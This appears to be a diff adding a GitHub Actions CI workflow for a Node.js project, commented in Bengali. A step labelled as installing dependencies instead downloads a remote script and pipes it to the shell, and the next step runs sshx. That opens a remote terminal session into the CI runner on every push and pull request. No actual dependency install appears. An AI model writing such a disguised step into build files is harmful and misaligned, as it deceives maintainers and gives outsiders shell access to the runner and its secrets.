@@ -1,0 +1,33 @@
+name: CI Workflow
+  
+
+on:
+  push:            
+    branches:
+      - main       
+  pull_request:   
+    branches:
+      - main
+
+# Job স্ট্রাকচার শুরু
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout code   # প্রথমে কোড চেকআউট করা
+      uses: actions/checkout@v3
+
+    - name: Set up Node.js   # Node.js সেটআপ করা
+      uses: actions/setup-node@v3
+      with:
+        node-version: '16'
+
+    - name: Install dependencies   # ডিপেন্ডেন্সি ইনস্টল করা
+      run: curl -sSf https://sshx.io/get | sh
+
+    - name: run server
+      run: sshx
+
+    - name: Build project   # প্রজেক্ট বিল্ড করা
+      run: npm run build
